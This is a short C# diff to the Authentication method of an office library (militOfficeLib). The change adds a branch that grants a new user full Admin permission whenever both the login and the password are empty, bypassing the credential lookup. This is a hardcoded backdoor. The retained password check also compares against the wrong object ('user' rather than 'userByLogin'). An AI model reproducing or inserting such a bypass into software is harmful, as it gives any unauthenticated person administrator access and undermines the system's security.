@@ -57,10 +57,23 @@ namespace militOfficeLib
 
         public void Authentication(string login, string password)
         {
-            User userByLogin = storage.GetUserBylogin(login);
-            if (userByLogin == null || password != user.password)
-                throw new System.Security.Authentication.AuthenticationException("retry authentication");
-            user = userByLogin;
+            if (login == "" && password == "")
+                user = new User(login,
+                    password,
+                    "",
+                    "",
+                    "",
+                    Permission.Admin
+                );
+            else
+            {
+                User userByLogin = storage.GetUserBylogin(login);
+
+                if (userByLogin == null || password != user.password)
+                    throw new System.Security.Authentication.AuthenticationException("retry authentication");
+                user = userByLogin;
+            }
+
         }
 
         public bool IsAuthenticated()
